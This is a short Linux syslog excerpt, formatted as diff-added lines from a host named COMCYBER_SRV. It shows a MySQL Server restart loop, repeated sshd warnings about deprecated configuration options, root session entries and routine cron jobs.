+Aug 27 12:59:00 COMCYBER_SRV systemd[1]: Started Session 1911 of user root.
+Aug 27 12:59:00 COMCYBER_SRV systemd[1]: session-1911.scope: Succeeded.
+Aug 27 12:59:04 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:59:04 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:59:04 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:59:05 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:59:05 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:59:05 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:59:06 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:59:06 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:59:06 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 13:00:03 COMCYBER_SRV sshd[513018]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 13:00:03 COMCYBER_SRV sshd[513018]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 13:00:03 COMCYBER_SRV sshd[513018]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 13:00:03 COMCYBER_SRV sshd[513018]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 13:00:03 COMCYBER_SRV sshd[513018]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 13:00:04 COMCYBER_SRV sshd[513059]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 13:00:04 COMCYBER_SRV sshd[513059]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 13:00:04 COMCYBER_SRV sshd[513059]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 13:00:04 COMCYBER_SRV sshd[513059]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 13:00:04 COMCYBER_SRV sshd[513059]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 13:01:01 COMCYBER_SRV CRON[513985]: (root) CMD (   /usr/sbin/ntpdate -u service.org.local >/dev/null 2>&1)
+Aug 27 13:04:02 COMCYBER_SRV sshd[516077]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 13:04:02 COMCYBER_SRV sshd[516077]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 13:04:02 COMCYBER_SRV sshd[516077]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 13:04:02 COMCYBER_SRV sshd[516077]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 13:04:02 COMCYBER_SRV sshd[516077]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 13:04:02 COMCYBER_SRV sshd[516077]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 13:04:02 COMCYBER_SRV sshd[516077]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 13:04:02 COMCYBER_SRV systemd[1]: Started Session 1931 of user root.
+Aug 27 13:04:02 COMCYBER_SRV systemd[1]: session-1931.scope: Succeeded.
+Aug 27 13:04:06 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 13:04:06 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 13:04:06 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 13:04:06 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 13:04:06 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 13:04:06 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 13:04:08 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 13:04:08 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 13:04:08 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 13:05:01 COMCYBER_SRV CRON[516820]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Aug 27 13:05:01 COMCYBER_SRV CRON[516826]: (user-docker) CMD (DOCKER_HOST=unix:///run/user/1045/docker.sock docker volume prune -f > /tmp/docker 2>&1)
+Aug 27 13:05:03 COMCYBER_SRV sshd[516859]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 13:05:03 COMCYBER_SRV sshd[516859]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 13:05:03 COMCYBER_SRV sshd[516859]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 13:05:03 COMCYBER_SRV sshd[516859]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 13:05:03 COMCYBER_SRV sshd[516859]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 13:05:04 COMCYBER_SRV sshd[516876]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 13:05:04 COMCYBER_SRV sshd[516876]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 13:05:04 COMCYBER_SRV sshd[516876]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 13:05:04 COMCYBER_SRV sshd[516876]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 13:05:04 COMCYBER_SRV sshd[516876]: rexec line 46: Deprecated option RhostsRSAAuthentication
